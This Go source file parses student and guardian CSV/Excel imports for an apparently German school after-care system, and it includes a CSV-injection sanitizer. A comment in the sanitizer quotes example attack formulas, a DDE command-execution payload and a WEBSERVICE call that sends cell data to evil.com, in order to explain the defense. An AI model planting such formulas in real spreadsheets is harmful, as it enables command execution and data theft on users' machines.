package importpkg

import (
	"fmt"
	"strconv"
	"strings"

	importModels "github.com/moto-nrw/project-phoenix/models/import"
)

// sanitizeCellValue prevents CSV injection attacks by prefixing formula characters with a single quote
// This forces Excel/LibreOffice to treat the value as text instead of a formula
//
// SECURITY: Protects against injection attacks where malicious formulas (=, +, -, @) could:
//   - Execute arbitrary commands (=cmd|'/c calc'!A1)
//   - Exfiltrate data (=WEBSERVICE("http://evil.com/"&A1))
//   - Access local files (=DDE(...))
//
// Reference: OWASP CSV Injection (https://owasp.org/www-community/attacks/CSV_Injection)
func sanitizeCellValue(value string) string {
	if value == "" {
		return value
	}

	// Check if the value starts with a dangerous character
	firstChar := value[0]
	if firstChar == '=' || firstChar == '+' || firstChar == '-' || firstChar == '@' || firstChar == '\t' || firstChar == '\r' {
		// Prefix with a single quote to force text interpretation
		// This is the standard defense recommended by OWASP
		return "'" + value
	}

	return value
}

// columnAliases maps deprecated column names to their current equivalents.
// This ensures old CSV templates with renamed columns still work.
var columnAliases = map[string]string{
	"erz1.primär":   "erz1.hauptansprechpartner",
	"erz2.primär":   "erz2.hauptansprechpartner",
	"erz3.primär":   "erz3.hauptansprechpartner",
	"erz1.abholung": "erz1.abholberechtigt",
	"erz2.abholung": "erz2.abholberechtigt",
	"erz3.abholung": "erz3.abholberechtigt",
}

// normalizeHeaderKey normalizes a CSV/Excel header for column mapping.
// Strips "(optional)", "(pflicht)" annotations and whitespace, then lowercases.
// Also applies backward-compatible aliases for renamed columns.
func normalizeHeaderKey(col string) string {
	key := strings.ToLower(strings.TrimSpace(col))
	// Strip annotation suffixes
	for _, suffix := range []string{"(optional)", "(pflicht)"} {
		key = strings.TrimSpace(strings.TrimSuffix(key, suffix))
	}
	// Apply backward-compatible aliases for renamed columns
	if alias, ok := columnAliases[key]; ok {
		key = alias
	}
	return key
}

// ColumnMapper provides column access functions for import parsing
type ColumnMapper struct {
	mapping map[string]int
	values  []string
}

// NewColumnMapper creates a new column mapper with the given mapping and values
func NewColumnMapper(mapping map[string]int, values []string) *ColumnMapper {
	return &ColumnMapper{mapping: mapping, values: values}
}

// GetCol returns a column value with CSV injection protection
func (m *ColumnMapper) GetCol(colName string) string {
	idx, exists := m.mapping[colName]
	if !exists || idx < 0 || idx >= len(m.values) {
		return "" // Column doesn't exist or out of range
	}
	return sanitizeCellValue(strings.TrimSpace(m.values[idx]))
}

// GetRawCol returns a column value without sanitization (for phone numbers)
// Phone numbers may start with + (international format) which would be corrupted by sanitization
func (m *ColumnMapper) GetRawCol(colName string) string {
	idx, exists := m.mapping[colName]
	if !exists || idx < 0 || idx >= len(m.values) {
		return ""
	}
	return strings.TrimSpace(m.values[idx])
}

// HasColumn checks if a column exists in the mapping
func (m *ColumnMapper) HasColumn(colName string) bool {
	_, exists := m.mapping[colName]
	return exists
}

// ParseBool parses German boolean values ("Ja"/"Nein")
func ParseBool(val string) bool {
	normalized := strings.ToLower(strings.TrimSpace(val))
	return normalized == "ja" || normalized == "yes" || normalized == "true" || normalized == "1"
}

// busDayColumns maps the optional per-day "Bus.Xx" import headers (German
// weekday abbreviations, lowercased by the column mapper) to the canonical
// bus_days weekday keys.
var busDayColumns = []struct{ col, key string }{
	{"bus.mo", "mon"},
	{"bus.di", "tue"},
	{"bus.mi", "wed"},
	{"bus.do", "thu"},
	{"bus.fr", "fri"},
}

// departureDayColumns maps the per-day "Gehweise.Xx" import headers (German
// weekday abbreviations, lowercased by the column mapper) to the canonical
// departure_days weekday keys. This is the current unified column: each cell
// holds one of alleine / bus / abholung.
var departureDayColumns = []struct{ col, key string }{
	{"gehweise.mo", "mon"},
	{"gehweise.di", "tue"},
	{"gehweise.mi", "wed"},
	{"gehweise.do", "thu"},
	{"gehweise.fr", "fri"},
}

// departureModeAliases maps the accepted German cell values (and the canonical
// English keys) to the stored departure mode. Empty / unknown cells are skipped
// by the caller so a blank day falls back to the legacy columns.
var departureModeAliases = map[string]string{
	"alleine":       "alone",
	"geht alleine":  "alone",
	"alone":         "alone",
	"bus":           "bus",
	"fährt bus":     "bus",
	"faehrt bus":    "bus",
	"abholung":      "pickup",
	"wird abgeholt": "pickup",
	"abgeholt":      "pickup",
	"pickup":        "pickup",
	// "Mit anderem Kind" (#1694): accompanied departure with another child.
	"mit anderem kind": "accompanied",
	"begleitet":        "accompanied",
	"accompanied":      "accompanied",
}

// parseDepartureDayColumns reads the optional per-day Gehweise columns
// (Gehweise.Mo..Gehweise.Fr). It returns nil unless at least one per-day cell
// holds a recognized value, in which case the caller treats it as the unified
// source of truth and ignores the legacy Bus/Abholstatus columns. As with the
// bus columns, the generated template always emits the headers, so keying off
// header presence alone would wrongly blank out the legacy fallback for a row
// the user left empty. departure_days is the single source of truth (#1610).
func parseDepartureDayColumns(mapper *ColumnMapper) (map[string]string, error) {
	var days map[string]string
	for _, d := range departureDayColumns {
		raw := mapper.GetCol(d.col)
		if raw == "" {
			continue
		}
		normalized := strings.ToLower(strings.TrimSpace(raw))
		mode, ok := departureModeAliases[normalized]
		if !ok {
			return nil, fmt.Errorf("%s enthält ungültigen Wert %q (erlaubt: alleine, bus, abholung, mit anderem Kind)", d.col, raw)
		}
		if days == nil {
			days = make(map[string]string, len(departureDayColumns))
		}
		days[d.key] = mode
	}
	return days, nil
}

// parseBusDayColumns reads optional per-day Buskind columns (Bus.Mo..Bus.Fr).
// It returns nil unless at least one per-day cell holds an explicit value, in
// which case the caller falls back to the legacy single "Bus" column. This
// matters because the generated template always emits the Bus.Mo..Bus.Fr
// headers: keying off header presence alone would make a row with "Bus=Ja" and
// blank per-day cells import as no bus days, contradicting the documented
// "legacy Bus=Ja → all weekdays" behavior. We therefore only let the per-day
// columns override the legacy flag when the user actually filled a cell.
// bus_days is the single source of truth (#1582).
func parseBusDayColumns(mapper *ColumnMapper) map[string]bool {
	var days map[string]bool
	for _, d := range busDayColumns {
		// GetCol returns "" for both an absent header and a present-but-blank
		// cell, so this skips both and only an explicit value counts as an
		// override.
		raw := mapper.GetCol(d.col)
		if raw == "" {
			continue
		}
		if days == nil {
			days = make(map[string]bool, len(busDayColumns))
		}
		days[d.key] = ParseBool(raw)
	}
	return days
}

// MapStudentRow maps column values to StudentImportRow using the shared mapping logic
func MapStudentRow(mapper *ColumnMapper) (importModels.StudentImportRow, error) {
	row := importModels.StudentImportRow{
		DataRetentionDays: 30, // Default
	}

	// Map student fields
	row.FirstName = mapper.GetCol("vorname")
	row.LastName = mapper.GetCol("nachname")
	row.SchoolClass = mapper.GetCol("klasse")
	row.GroupName = mapper.GetCol("gruppe")
	row.Birthday = mapper.GetCol("geburtstag")
	row.TagID = mapper.GetCol("rfid")
	row.HealthInfo = mapper.GetCol("gesundheitsinfo")
	row.SupervisorNotes = mapper.GetCol("betreuernotizen")
	row.ExtraInfo = mapper.GetCol("zusatzinfo")
	row.PickupStatus = mapper.GetCol("abholstatus")
	row.BusPermission = ParseBool(mapper.GetCol("bus"))
	row.BusDays = parseBusDayColumns(mapper)
	departureDays, err := parseDepartureDayColumns(mapper)
	if err != nil {
		return row, err
	}
	row.DepartureDays = departureDays
	// Free-text "mit wem" for the accompanied departure mode (#1694).
	row.DepartureCompanionNote = mapper.GetCol("begleitung")
	row.EnrolledFrom = mapper.GetCol("einschreibung von")
	row.EnrolledUntil = mapper.GetCol("einschreibung bis")

	// Consent dates (explicit date the consent was given)
	row.AGBAcceptedAt = mapper.GetCol("agb akzeptiert am")
	row.DataProcessingAcceptedAt = mapper.GetCol("datenverarbeitung akzeptiert am")
	row.EmailContactAcceptedAt = mapper.GetCol("e-mail-kontakt akzeptiert am")
	row.PhotoConsentGivenAt = mapper.GetCol("foto-einwilligung am")

	// Privacy consent
	row.PrivacyAccepted = ParseBool(mapper.GetCol("datenschutz"))
	if retentionStr := mapper.GetCol("aufbewahrung(tage)"); retentionStr != "" {
		retention, err := strconv.Atoi(retentionStr)
		if err != nil {
			return row, fmt.Errorf("ungültiger Wert für Aufbewahrung(Tage): '%s'. Bitte nur Zahlen verwenden (z.B. 7, 14, 30)", retentionStr)
		}
		row.DataRetentionDays = retention
	}

	// AUTO-DETECT GUARDIANS (Erz1, Erz2, Erz3, ...)
	guardianNum := 1
	for {
		emailKey := fmt.Sprintf("erz%d.email", guardianNum)
		phoneKey := fmt.Sprintf("erz%d.telefon", guardianNum)
		mobileKey := fmt.Sprintf("erz%d.mobil", guardianNum)

		// Check if this guardian number exists
		if !mapper.HasColumn(emailKey) && !mapper.HasColumn(phoneKey) && !mapper.HasColumn(mobileKey) {
			break // No more guardians
		}

		guardian := importModels.GuardianImportData{
			FirstName:          mapper.GetCol(fmt.Sprintf("erz%d.vorname", guardianNum)),
			LastName:           mapper.GetCol(fmt.Sprintf("erz%d.nachname", guardianNum)),
			Email:              mapper.GetCol(emailKey),
			Phone:              mapper.GetRawCol(phoneKey),
			MobilePhone:        mapper.GetRawCol(mobileKey),
			RelationshipType:   mapper.GetCol(fmt.Sprintf("erz%d.verhältnis", guardianNum)),
			IsPrimary:          ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.hauptansprechpartner", guardianNum))),
			IsEmergencyContact: ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.notfall", guardianNum))),
			CanPickup:          ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.abholberechtigt", guardianNum))),
		}

		// Parse flexible phone numbers into PhoneNumbers array
		guardian.PhoneNumbers = ParseGuardianPhoneNumbers(guardianNum, mapper.GetRawCol)

		// Guardian profile fields (address, notes, language)
		guardian.AddressStreet = mapper.GetCol(fmt.Sprintf("erz%d.straße", guardianNum))
		guardian.AddressCity = mapper.GetCol(fmt.Sprintf("erz%d.stadt", guardianNum))
		guardian.AddressPostalCode = mapper.GetCol(fmt.Sprintf("erz%d.plz", guardianNum))
		guardian.Notes = mapper.GetCol(fmt.Sprintf("erz%d.notizen", guardianNum))
		guardian.LanguagePreference = mapper.GetCol(fmt.Sprintf("erz%d.sprache", guardianNum))

		// Only add if has contact info (skip empty guardians)
		hasPhoneNumbers := len(guardian.PhoneNumbers) > 0
		if guardian.Email != "" || guardian.Phone != "" || guardian.MobilePhone != "" || hasPhoneNumbers {
			row.Guardians = append(row.Guardians, guardian)
		}

		guardianNum++
	}

	// Parse pickup schedule (Mon-Fri) with per-day notes
	dayColumns := []struct {
		key      string
		notesKey string
		weekday  int
	}{
		{"abholung.mo", "abholung.mo.notizen", 1},
		{"abholung.di", "abholung.di.notizen", 2},
		{"abholung.mi", "abholung.mi.notizen", 3},
		{"abholung.do", "abholung.do.notizen", 4},
		{"abholung.fr", "abholung.fr.notizen", 5},
	}
	for _, d := range dayColumns {
		timeStr := mapper.GetCol(d.key)
		notes := mapper.GetCol(d.notesKey)
		if timeStr != "" {
			row.PickupSchedules = append(row.PickupSchedules, importModels.PickupScheduleImportData{
				Weekday:    d.weekday,
				PickupTime: timeStr,
				Notes:      notes,
			})
		}
	}

	// Parse arrival schedule (Mon-Fri) with per-day notes
	arrivalDayColumns := []struct {
		key      string
		notesKey string
		weekday  int
	}{
		{"ankunft.mo", "ankunft.mo.notizen", 1},
		{"ankunft.di", "ankunft.di.notizen", 2},
		{"ankunft.mi", "ankunft.mi.notizen", 3},
		{"ankunft.do", "ankunft.do.notizen", 4},
		{"ankunft.fr", "ankunft.fr.notizen", 5},
	}
	for _, d := range arrivalDayColumns {
		timeStr := mapper.GetCol(d.key)
		notes := mapper.GetCol(d.notesKey)
		if timeStr != "" {
			row.ArrivalSchedules = append(row.ArrivalSchedules, importModels.ArrivalScheduleImportData{
				Weekday:         d.weekday,
				ExpectedArrival: timeStr,
				Notes:           notes,
			})
		}
	}

	return row, nil
}

// PhoneMapping defines a phone column mapping
type PhoneMapping struct {
	Suffix    string
	PhoneType string
	Label     string
}

// DefaultPhoneMappings returns the standard phone column mappings
func DefaultPhoneMappings() []PhoneMapping {
	return []PhoneMapping{
		{"telefon", "home", ""},
		{"telefon2", "home", ""},
		{"mobil", "mobile", ""},
		{"mobil2", "mobile", ""},
		{"dienstlich", "work", "Dienstlich"},
		{"dienstlich2", "work", "Dienstlich"},
	}
}

// ParseGuardianPhoneNumbers extracts phone numbers from columns into PhoneImportData array
func ParseGuardianPhoneNumbers(guardianNum int, getCol func(string) string) []importModels.PhoneImportData {
	var phones []importModels.PhoneImportData
	priority := 1

	for _, mapping := range DefaultPhoneMappings() {
		colKey := fmt.Sprintf("erz%d.%s", guardianNum, mapping.Suffix)
		value := getCol(colKey)
		if value != "" {
			phones = append(phones, importModels.PhoneImportData{
				PhoneNumber: value,
				PhoneType:   mapping.PhoneType,
				Label:       mapping.Label,
				IsPrimary:   priority == 1,
			})
			priority++
		}
	}

	return phones
}
